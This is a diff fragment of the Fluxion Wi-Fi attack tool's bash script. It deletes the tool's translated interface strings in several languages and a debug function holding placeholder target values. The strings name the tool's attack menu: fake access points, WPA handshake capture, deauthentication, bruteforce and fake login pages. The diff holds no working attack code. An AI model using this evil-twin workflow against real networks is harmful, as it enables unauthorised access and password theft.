-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	header_scan="WIFI Monitor"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	header_scanchan="Scanning Target"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	header_askAP="Select Attack Option"
-	askAP_option_1="FakeAP - Hostapd ("$red"Recommended)"
-	askAP_option_2="FakeAP - airbase-ng (Slower connection)"
-	askAP_option_4="Bruteforce - (Handshake is required)"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	header_askauth="METHOD TO VERIFY THE PASSWORD"
-	askauth_option_1="Handshake ("$red"Recommended)"
-	askauth_option_2="Wpa_supplicant(More failures)"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	header_deauthforce="Handshake check"
-	deauthforce_option_1="aircrack-ng (Miss chance)"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	header_deauthMENU="*Capture Handshake*"
-	deauthMENU_option_1="Check handshake"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	header_webinterface="Select your option"
-	header_ConnectionRESET="Select Login Page"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	general_back="Back"
-	general_error_1="Not_Found"
-	general_case_error="Unknown option. Choose again"
-	general_exitmode="Cleaning and closing"
-	general_exitmode_1="Disabling monitoring interface"
-	general_exitmode_2="Disabling interface"
-	general_exitmode_3="Disabling "$grey"forwarding of packets"
-	general_exitmode_4="Cleaning "$grey"iptables"
-	general_exitmode_5="Restoring "$grey"tput"
-	general_exitmode_6="Restarting "$grey"Network-Manager"
-	general_exitmode_7="Cleanup performed successfully!"
-	general_exitmode_8="Thanks for using fluxion"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	selection_1="Active clients"
-	selection_2="Select target. For rescan type$red r$transparent"
-	}
-
-function romanian {
-    header_setinterface="Selecteaza o interfata"
-    setinterface_error="Nu este nici o placa de retea wireless, iesire..."
-
-    #
-    header_choosescan="Selecteaza canalul"
-    choosescan_option_1="Toate canalele "
-    choosescan_option_2="Canal specific(s)"
-    #
-    scanchan_option_1="Un singur canal"
-    scanchan_option_2="Canale multiple"
-    #
-    header_scan="WIFI Monitor"
-    #
-    header_scanchan="Scaneaza tinta"
-    #
-    header_askAP="Selecteaza optiunea de atac"
-    askAP_option_1="FakeAP - Hostapd ("$red"Recomandat)"
-    askAP_option_2="FakeAP - airbase-ng (Conexiune mai lenta)"
-    askAP_option_4="Bruteforce - (Handshake este necesara)"
-    #
-    header_askauth="METODA PENTRU VERIFICAREA PAROLEI"
-    askauth_option_1="Handshake ("$red"Recomandat)"
-    askauth_option_2="Wpa_supplicant(Mai multe eșecuri)"
-    #
-    header_deauthforce="Verificare Handshake"
-    deauthforce_option_1="aircrack-ng (Sansa ratata)"
-    #
-    header_deauthMENU="*Capturare Handshake*"
-    deauthMENU_option_1="Verificare handshake"
-    #
-    handshakelocation_1="Handshake locatie  (Examplu: $red$WORK_DIR.cap$transparent)"
-    handshakelocation_2="Apasa ${yellow}ENTER$transparent to skip"
-    #
-    header_webinterface="Selecteaza optiunea ta"
-    header_ConnectionRESET="Selecteaza pagina de logare"
-    #
-    general_back="Inapoi"
-    general_error_1="Nu a fost gasit"
-    general_case_error="Optiune necunoscuta. Incearca din nou"
-    general_exitmode="Curatire si inchidere"
-    general_exitmode_1="Dezacticati interfata monitorizata"
-    general_exitmode_2="Dezactivati interfata"
-    general_exitmode_3="Dezactivati "$grey"forwarding of packets"
-    general_exitmode_4="Curatire "$grey"iptables"
-    general_exitmode_5="Restaurare "$grey"tput"
-    general_exitmode_6="Restartare "$grey"Network-Manager"
-    general_exitmode_7="Curatire efectuata cu succes!"
-    general_exitmode_8="Multumesc pentru ca ati folosit fluxion"
-    #
-    selection_1="Clienti activi"
-    selection_2="Selecteaza tinta. Pentru rescanare tastati$red r$transparent"
-
-}
-
-function turkish {
-	header_setinterface="Bir Ag Secin"
-    setinterface_error="Wireless adaptorunuz yok, program kapatiliyor..."
-
-    #
-    header_choosescan="Kanal Sec"
-    choosescan_option_1="Tum Kanallar "
-    choosescan_option_2="Sectigim Kanal ya da Kanallar"
-    #
-    scanchan_option_1="Tek Kanal"
-    scanchan_option_2="Coklu Kanal"
-    #
-    header_scan="Wifi Goruntule"
-    #
-    header_scanchan="Hedef Taraniyor"
-    #
-    header_askAP="Saldiri Tipi Secin"
-    askAP_option_1="SahteAP - Hostapd ("$red"Tavsiye Edilen)"
-    askAP_option_2="SahteAP - airbase-ng (Yavas Baglanti)"
-    askAP_option_4="Kabakuvvet - (Handshake Gereklidir)"
-    #
-    header_askauth="Sifre Kontrol Metodu"
-    askauth_option_1="Handshake ("$red"Tavsiye Edilen)"
-    askauth_option_2="Wpa_supplicant(Hata Orani Yuksek)"
-    #
-    header_deauthforce="Handshake Kontrol"
-    deauthforce_option_1="aircrack-ng (Hata Sansı Var)"
-    #
-    header_deauthMENU="*Kaydet Handshake*"
-    deauthMENU_option_1="Kontrol Et handshake"
-    #
-    handshakelocation_1="handshake Dizini  (Ornek: $red$WORK_DIR.cap$transparent)"
-    handshakelocation_2="Tusa Bas ${yellow}ENTER$transparent Gecmek icin"
-    #
-    header_webinterface="Secenegi Sec"
-    header_ConnectionRESET="Giris Sayfasini Sec"
-    #
-    general_back="Geri"
-    general_error_1="Bulunamadi"
-    general_case_error="Bilinmeyen Secenek. Tekrar Seciniz"
-    general_exitmode="Temizleniyor ve Kapatiliyor"
-    general_exitmode_1="Monitor modu kapatiliyor"
-    general_exitmode_2="Ag Arayuzu kapatiliyor"
-    general_exitmode_3="Kapatiliyor "$grey"forwarding of packets"
-    general_exitmode_4="Temizleniyor "$grey"iptables"
-    general_exitmode_5="Yenileniyor "$grey"tput"
-    general_exitmode_6="Tekrar Baslatiliyor "$grey"Network-Manager"
-    general_exitmode_7="Temizlik Basariyla Tamamlandi!"
-    general_exitmode_8="Fluxion kullandiginiz icin tesekkurler."
-    #
-    selection_1="Aktif kullanicilar"
-    selection_2="Tekrar taramak icin Hedef seciniz type$red r$transparent"
-
-}
-
-function spanish {
-	header_setinterface="Seleccione una interfase"
-    setinterface_error="No hay tarjetas inalambricas, saliendo..."
-
-    #
-    header_choosescan="Seleccione canal"
-    choosescan_option_1="Todos los canales "
-    choosescan_option_2="Canal(es) específico(s)"
-    #
-    scanchan_option_1="Canal único"
-    scanchan_option_2="Canales múltiples"
-    #
-    header_scan="WIFI Monitor"
-    #
-    header_scanchan="Escaneando objetivo"
-    #
-    header_askAP="Seleccione Opción de Ataque"
-    askAP_option_1="FakeAP - Hostapd ("$red"Recomendado)"
-    askAP_option_2="FakeAP - airbase-ng (Conexión más lenta)"
-    askAP_option_4="Bruteforce - (Se requiere handshake)"
-    #
-    header_askauth="MÉTODO PARA VERIFICAR CONTRASEÑA"
-    askauth_option_1="Handshake ("$red"Recomendado)"
-    askauth_option_2="Wpa_supplicant(Más Fallas)"
-    #
-    header_deauthforce="Chequeo de Handshake"
-    deauthforce_option_1="aircrack-ng (Posibilidad de error)"
-    #
-    header_deauthMENU="*Capturar Handshake*"
-    deauthMENU_option_1="Chequear handshake"
-    #
-    handshakelocation_1="ubicación del handshake  (Ejemplo: $red$WORK_DIR.cap$transparent)"
-    handshakelocation_2="Presione ${yellow}ENTER$transparent para saltar"
-    #
-    header_webinterface="Seleccione su opción"
-    header_ConnectionRESET="Seleccione página de Login"
-    #
-    general_back="Atrás"
-    general_error_1="No_Encontrado"
-    general_case_error="Opción desconocida. Elija de nuevo"
-    general_exitmode="Limpiando y cerrando"
-    general_exitmode_1="Deshabilitando interfaz de monitoreo"
-    general_exitmode_2="Deshabilitando interfaz"
-    general_exitmode_3="Deshabilitando "$grey"reenvio de paquetes"
-    general_exitmode_4="Limpiando "$grey"iptables"
-    general_exitmode_5="Restaurando "$grey"tput"
-    general_exitmode_6="Reiniciando "$grey"Network-Manager"
-    general_exitmode_7="Limpieza realizada satisfactoriamente!"
-    general_exitmode_8="Gracias por usar fluxion"
-    #
-    selection_1="Clientes activos"
-    selection_2="Seleccione objetivo. Para reescanear teclee$red r$transparent"
-
-
-}
-
-function chinese {
-
-	setinterface_error="没有检测到网卡 退出..."
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	header_choosescan="选择信道"
-	choosescan_option_1="所有信道 "
-	choosescan_option_2="指定信道"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	scanchan_option_1="单一信道"
-	scanchan_option_2="多个信道"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	header_scanchan="正在扫描目标"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	header_askAP="选择攻击选项"
-	askAP_option_1="伪装AP - Hostapd ("$red"推荐)"
-	askAP_option_4="暴力破解 - (需要握手包)"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	header_askauth="请选择验证密码方式"
-	askauth_option_2="提供的wpa (易错)"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	header_deauthforce="握手包检查"
-	deauthforce_option_1="aircrack-ng (Miss chance)"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	header_deauthMENU="*抓握手包*"
-	deauthMENU_option_1="检查握手包"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	header_webinterface="请选择"
-	header_ConnectionRESET="选择登陆界面"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	general_back="返回"
-	general_error_1="未找到"
-	general_case_error="未知选项. 请再次选择"
-	general_exitmode="清理并退出"
-	general_exitmode_3="关闭 "$grey"forwarding of packets"
-	general_exitmode_4="清理 "$grey"iptables"
-	general_exitmode_5="恢复 "$grey"tput"
-	general_exitmode_6="重启 "$grey"Network-Manager"
-	general_exitmode_7="清理完成!"
-	general_exitmode_8="感谢使用fluxion!"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	selection_1="活动的客户端"
-	selection_2="选择一个目标. 重扫 按$red r$transparent"
-
-}
-
-function italian {
-
-    header_setinterface="Seleziona un'interfaccia"
-    setinterface_error="Nessuna scheda di rete trovata, chiusura..."
-
-    #
-    header_choosescan="Selezione Canale"
-    choosescan_option_1="Tutti i Canali"
-    choosescan_option_2="Definisci Canale/i"
-    #
-    scanchan_option_1="Canale Singolo"
-    scanchan_option_2="Canali Multipli"
-    #
-    header_scan="WIFI Monitor"
-    #
-    header_scanchan="Scansione dell'Obiettivo"
-    #
-    header_askAP="Seleziona Opzione d'Attacco"
-    askAP_option_1="FakeAP - Hostapd ("$red"Consigliato!)"
-    askAP_option_2="FakeAP - airbase-ng (Connessione Lenta)"
-    askAP_option_4="Bruteforce - (Richiede handshake)"
-    #
-    header_askauth="MODALITA' DI VERIFICA DELLA PASSWORD"
-    askauth_option_1="Handshake ("$red"Consigliato!)"
-    askauth_option_2="Wpa_supplicant(Rischio di Insuccesso)"
-    #
-    header_deauthforce="Controllo dell'Handshake"
-    deauthforce_option_1="aircrack-ng (Possibilità di Errori)"
-    #
-    header_deauthMENU="*Cattura dell'Handshake*"
-    deauthMENU_option_1="Controllo handshake"
-    #
-    handshakelocation_1="posizione dell'handshake  (Esempio: $red$WORK_DIR.cap$transparent)"
-    handshakelocation_2="Premi ${yellow}INVIO$transparent per avanzare"
-    #
-    header_webinterface="Seleziona la tua scelta"
-    header_ConnectionRESET="Seleziona la pagina di Login"
-    #
-    general_back="Indietro"
-    general_error_1="Non_Trovato"
-    general_case_error="Opzione Sconosciuta. Scegli di nuovo"
-    general_exitmode="Pulizia e chiusura"
-    general_exitmode_1="Disabilito l'Interfaccia Monitor"
-    general_exitmode_2="Disabilito l'Interfaccia"
-    general_exitmode_3="Disabilito "$grey"l'invio dei pacchetti"
-    general_exitmode_4="Pulisco "$grey"iptables"
-    general_exitmode_5="Ripristino "$grey"tput"
-    general_exitmode_6="Riavvio il "$grey"Network-Manager"
-    general_exitmode_7="Pulizia avvenuta con successo!"
-    general_exitmode_8="Grazie per aver utilizzato Fluxion"
-    #
-    selection_1="Dispositivi connessi"
-    selection_2="Seleziona Obiettivo. Per effettuare una nuova scansione delle reti premi$red r$transparent"
-
-}
-
-function czech {
-	header_setinterface="Vyberte rozhraní"
-	setinterface_error="Žádná síťová rozhraní, zavíraní..."
-
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	header_choosescan="Vyberte kanál"
-	choosescan_option_1="Všechny kanály"
-	choosescan_option_2="Specifický kanál(y)"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	scanchan_option_1="Jeden kanál"
-	scanchan_option_2="Více kanálů"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	header_scan="Sledování WIFI"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	header_scanchan="Skenování cíle"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	header_askAP="Vyberte metodu útočení"
-	askAP_option_1="FakeAP - Hostapd ("$red"Doporučeno)"
-	askAP_option_2="FakeAP - airbase-ng (Pomalejší připojení)"
-	askAP_option_4="Bruteforce - (Potřebný Handshake)"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	header_askauth="METHODA ZÍSKÁNÍ HESLA"
-	askauth_option_1="Handshake ("$red"Doporučeno)"
-	askauth_option_2="Wpa_supplicant(Více chyb)"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	header_deauthforce="Potvrzení Handshaku"
-	deauthforce_option_1="aircrack-ng (Minutí šance)"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	header_deauthMENU="*Nahrát Handshake*"
-	deauthMENU_option_1="Zkontrolovat handshake"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	header_webinterface="Vyberte"
-	header_ConnectionRESET="Vyberte přihlašovací stránku"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	general_back="Zpět"
-	general_error_1="Nenalezeno"
-	general_case_error="Neznámý výběr. Vyberte znovu"
-	general_exitmode="Čištění a zavírání"
-	general_exitmode_1="Vypínání monitorovacího rozhraní"
-	general_exitmode_2="Vypínání rozhraní"
-	general_exitmode_3="Vypínání "$grey"směrování packetů"
-	general_exitmode_4="Čištění "$grey"iptables"
-	general_exitmode_5="Obnovování "$grey"tput"
-	general_exitmode_6="Restartování "$grey"Network-Manager"
-	general_exitmode_7="Vyčištění proběhlo úspěšně!"
-	general_exitmode_8="Děkujeme pro používání programu fluxion"
-	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-	selection_1="Aktivní klienti"
-	selection_2="Select target. Pro znovuskenování napište$red r$transparent"
-
-}
-
-function greek {
-    header_setinterface="Επιλέξτε μία διεπαφή"
-    setinterface_error="Δεν υπάρχουν ασύρματες κάρτες δικτύου, έξοδος..."
-
-    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-    header_choosescan="Επίλεξτε κανάλι"
-    choosescan_option_1="Όλα τα κανάλια"
-    choosescan_option_2="Συγκεκριμένο(α) κανάλι(α)"
-    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-    scanchan_option_1="Μονό κανάλι"
-    scanchan_option_2="Πολλαπλά κανάλια"
-    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-    header_scan="Εποπτεία Wi-Fi"
-    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-    header_scanchan="Σκανάρισμα στόχου"
-    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-    header_askAP="Επίλογη τύπου επίθεσης"
-    askAP_option_1="FakeAP - Hostapd ("$red"Συνιστάται)"
-    askAP_option_2="FakeAP - airbase-ng (Πιό αργή σύνδεση)"
-    askAP_option_4="Bruteforce - (Απαιτείται το Handshake)"
-    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-    header_askauth="Μέθοδος επαλήθευσης κωδικού πρόσβασης"
-    askauth_option_1="Handshake ("$red"Συνιστάται)"
-    askauth_option_2="Wpa_supplicant(Περισσότερες αποτυχίες)"
-    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-    header_deauthforce="Επαλήθευση Handshake"
-    deauthforce_option_1="aircrack-ng (Πιθανότητα αποτυχίας)"
-    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-    header_deauthMENU="*Λήψη του Handshake*"
-    deauthMENU_option_1="Έλεγχος του handshake"
-    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-    header_webinterface="Επίλεξτε την επιλογή σας"
-    header_ConnectionRESET="Επίλογη Σελίδας Εισόδου"
-    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-    general_back="Πίσω"
-    general_error_1="Δέν_βρέθηκε"
-    general_case_error="Άγνωστη επιλογή. Επιλέξτε ξανά"
-    general_exitmode="Καθαρισμός και τερματισμός"
-    general_exitmode_1="Απενεργοποίση εποπτείας περιβάλλοντος"
-    general_exitmode_2="Απενεργοποίηση περιβάλλοντος"
-    general_exitmode_3="Απενεργοποίηση "$grey"προώθησης των πακέτων"
-    general_exitmode_4="Καθαρισμός "$grey"iptables"
-    general_exitmode_5="Επαναφορά "$grey"tput"
-    general_exitmode_6="Επανεκκίνηση "$grey"του Διαχειριστή δικτύου"
-    general_exitmode_7="Ο Καθαρισμός εκτελέστηκε με επιτυχία!"
-    general_exitmode_8="Ευχαριστούμε που χρησιμοποιήσατε το fluxion"
-    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-    selection_1="Ενεργοί πελάτες"
-    selection_2="Επιλέξτε στόχο. Για σκανάρισμα ξανά, πατήστε το$red r$transparent"
 
 }
 
@@ -1610,18 +862,6 @@ function setinterface {
 	fi
 
 	deltax
-}
-
-function skipme {
-	FLUX_DEBUG=1
-	Host_SSID="DEV"
-	Host_ENC="WPA 2"
-	channel="12"
-	speed="54"
-	Host_MAC="XX:a5:89:ad:e9:XX"
-	mac="$Host_MAC"
-	Host_MAC_MODEL="XX:a5:89:ad:e9:XX"
-	askAP
 }
 
 # Check files
